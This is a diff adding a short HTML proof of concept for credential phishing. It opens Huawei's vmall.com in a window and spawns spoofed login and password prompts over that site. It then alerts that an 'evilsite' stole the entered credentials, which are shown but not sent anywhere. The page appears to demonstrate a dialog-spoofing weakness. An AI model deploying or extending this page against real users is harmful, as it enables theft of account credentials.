@@ -1,0 +1,13 @@
+<html><head><meta charset="UTF-8">
+<!--自适应手机分辨率-->
+<meta name="viewport" content="width=device-width, target-densitydpi=device-dpi, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<script>
+function phishing(){
+aa=window.open('https://www.vmall.com/','new','width=800,height=600');
+    name=aa.prompt("访问vmall请登录华为账号\n请输入账号/手机号：");
+    passwd=aa.prompt("访问vmall请登录华为账号\n请输入密码：");
+    aa.alert("evilsite窃取了你的\n账号: "+name+"\n密码: "+passwd);
+    aa.document.write("<h1>phishing</h1>");
+}
+</script>
+</head><body><button onclick="phishing()">Click me</button></body></html>
